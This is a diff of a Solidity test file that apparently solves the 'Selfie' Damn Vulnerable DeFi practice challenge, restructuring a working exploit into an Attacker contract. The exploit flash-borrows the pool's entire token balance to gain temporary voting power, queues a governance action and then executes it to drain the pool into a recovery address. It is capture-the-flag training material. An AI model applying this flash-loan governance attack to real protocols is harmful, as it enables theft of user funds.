@@ -9,7 +9,7 @@ import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";//added by tina
 
 
-contract SelfieChallenge is Test, IERC3156FlashBorrower {
+contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
@@ -64,13 +64,44 @@ contract SelfieChallenge is Test, IERC3156FlashBorrower {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-
-        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");
+        Attacker attacker = new Attacker(pool, governance, token, recovery);
+        attacker.attack();
 
         //2 day action delay
         vm.warp(block.timestamp + 2 days);
 
         governance.executeAction(1);
+    }
+
+    /**
+     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
+     */
+    function _isSolved() private view {
+        // Player has taken all tokens from the pool
+        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract Attacker is IERC3156FlashBorrower {
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+    DamnValuableVotes private token;
+    address private recovery;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(this, address(token), token.balanceOf(address(pool)), "");
     }
 
     //this get called by the pool during flashLoan
@@ -90,21 +121,5 @@ contract SelfieChallenge is Test, IERC3156FlashBorrower {
         token.approve(address(pool), amount);
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
-
-        //this is why the exploit works: the flash loan allows temporary acquisition of voting power to queue a governance action(call emergencyExit) 
-
-    }
-    
-    /**
-     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
-     */
-    function _isSolved() private view {
-        // Player has taken all tokens from the pool
-        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(
-            token.balanceOf(recovery),
-            TOKENS_IN_POOL,
-            "Not enough tokens in recovery account"
-        );
     }
 }
